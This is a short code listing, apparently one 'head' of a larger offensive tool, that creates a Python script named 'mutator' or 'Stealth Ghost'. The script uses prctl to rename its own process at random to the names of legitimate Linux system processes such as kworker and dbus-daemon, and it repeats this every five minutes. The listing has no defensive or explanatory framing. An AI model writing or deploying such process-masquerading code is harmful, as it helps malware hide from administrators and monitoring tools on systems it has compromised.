Head 4: The Mutator (Stealth Ghost)
nano dna/mutator.py

import ctypes, time, random
def hide():
    names = ["kworker/u16:1", "systemd-helper", "dbus-daemon"]
    name = random.choice(names)
    libc = ctypes.cdll.LoadLibrary('libc.so.6')
    buff = ctypes.create_string_buffer(len(name) + 1)
    buff.value = name.encode('utf-8')
    libc.prctl(15, ctypes.byref(buff), 0, 0, 0)
if __name__ == "__main__":
    while True: hide(); time.sleep(300)
